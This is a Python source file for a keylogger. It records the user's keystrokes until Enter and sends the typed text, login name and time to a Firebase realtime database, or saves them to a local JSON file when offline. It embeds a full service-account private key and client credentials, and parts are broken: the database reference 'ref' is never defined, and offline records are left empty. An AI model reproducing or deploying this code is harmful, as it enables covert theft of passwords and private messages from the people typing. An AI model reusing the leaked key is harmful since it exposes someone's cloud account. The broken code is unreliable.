import keyboard
import os
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from datetime import datetime
import requests
import json

login_name = os.getlogin()


firebase_cred = {
  "type": "service_account",
  "project_id": "mtesting-7f9d0",
  "private_key_id": "b2d1b5ff9d5c32bef89ee452e4dc87056f410bd7",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDlwRl/Z5BMuWjt\n9i2Hoz0YR7+Qyaq5WGhgfroP+L0mUfWdx72lauu3YDlrSI/pXHxh6IPVH5uDcNu4\n6W0k/sP06GnmNalIM/a8hA4qYKWBCgXj+0mZ+vjxEpzEgmBWNvxK+fcGZI+gL1ZN\nqeX8mvtzNYjxJfedJOa8NjnBB5cOv56VuWLCSNPlzJKXSWOg4DOktsEgYhotaN7i\n9yx6aWJiIT+ILtOFUXQ50/NZNT4X/qUD6OGCFKl2GlltneE2cxolmvwkfbUVz8xp\njwS2wOj7ZkbnAnRbR4gWh9tsLPodMXOLnsBB+Vq1FHGlOzA37OeoA3Oo+/8/lQsy\ns4Rf8kNTAgMBAAECggEALSoHbB8co6hy8wxIqPgy41n/U2QBVowFgKqIwuj/rc/A\nu7JvGlxpV9Pnlape993BabG+cJ/U/0KpPrFMTlByjus9Hg8AZvwoDajb7AKxpisl\nO0rDjixi0Wj6Pjru2yPV9psqrywHe9KyYXP7jOuecGhesiDnixGc9fSm58YpMLGl\nArJ7XPTs21dskdU9ZOlqFJZcH07YNnNSJb+cVNguzwC2fVeErgYg946WtoiIuOcG\nlAS+H//AGodm+pFUuLeauT5A3EgbQRdYJqXy/y8XLgwctjy0SFMeHoVux+o7741r\nbfXvJYxlKrzkJQKeM4n5HmLDqxWpOUUWpG0QLcFEUQKBgQD6MCT3LfOXqzc/F+vO\nH0q833EA1jDdyEz3EHqrWLRhY282X60Q49Th/NXjZW/Cqah4EtmOfdeBkmd7rz/Z\ntcuVUgE7meB0Go93KIXEt0yB7AAfIgg5PNJDVQD44AKuB5mCTglz6Ghq8UZQ+rsu\n6L+4CogiJOfAzH0hzGp1mtUk2QKBgQDrF2/G0athYfFFkA+lFQgUtNmjUwQJ4Gsz\nDZFtWdAdclrkGPKWlefQ5fIdSIltLLojQ3WJ4sxYY62/zGPis0J8NJyrziMYYXn5\ncxHXZLx3zwzrNxG/f/9iVNcyuH9ZQ16dTBoOJMH79o4QuzdkSMtd/L8O3wC+hT/a\nvon8DhJeCwKBgEC50eZs6fdUIV/eVXAnIlPIzthzkYLfPiIxDjtkII6NhgkgKYsU\nFlA89Cz3YjmPYPlnjwdRQT7RXJpgFXnCkZ/Y7l64CZyf/nvKbQkejtmR79oeGNiO\nBqvKwwygD7FsX+eZPtLQzqrULufmZiTVrDv15ZBH0flMLhdfZi901i3JAoGBAJPK\neAqVZRgjanpAxpURU7MwvmFenvtWig3eSb5k5+CbM2iSBm+Ebed1p2+hWkO4CoyA\nrDOy0KQAhgo9g83Qw8sxiAy52nZJUVTwchbmzVTEZWq5g/7PiM1YaLEKK4UCRUi9\nvuOFWC3+IfGCwJ/a436CldnTd7ROMIZjontCnWlhAoGBAPAf8Js0UYSs7MiXHeOZ\nxCtr7w80xkbjfg4u6rE0ObneejLsmkg0pBm1fhWGZp+7JVsJDLShGHYd52y8qglC\n6lq2vOKpQ5QNxvJDdAP2Hi7qr+m7Di7+TkAtAPRuBkNuplP1tYBiPl5V3pw9Ijxv\nv0bbw6/fVpI8QRXj0Ht6tH/3\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-7les5@mtesting-7f9d0.iam.gserviceaccount.com",
  "client_id": "103926142398134133143",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-7les5%40mtesting-7f9d0.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}


cred = credentials.Certificate(firebase_cred)
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://mtesting-7f9d0-default-rtdb.asia-southeast1.firebasedatabase.app/'
})



def is_online():
    try:
        # Try to make a request to a known website
        response = requests.get("http://www.google.com", timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

while True:
    if is_online():
        # If the device is online, immediately push the data to Firebase
        recorded_events = keyboard.record(until="enter")
        required_text = ''
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        for event in recorded_events:
            if event.event_type == keyboard.KEY_DOWN:
                required_text += event.name

        ref.push({
            'device_name': login_name,
            'typed_text': required_text,
            'datetime': current_datetime
        })
    else:
        # If the device is offline, store the data locally in a JSON file
        recorded_events = keyboard.record(until="enter")
        required_text = ''
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = {
            'login_name': login_name,
            'event_name': required_text,
            'datetime': current_datetime
        }

        with open('offline_data.json', 'a') as f:
            json.dump(data, f)
            f.write('\n')
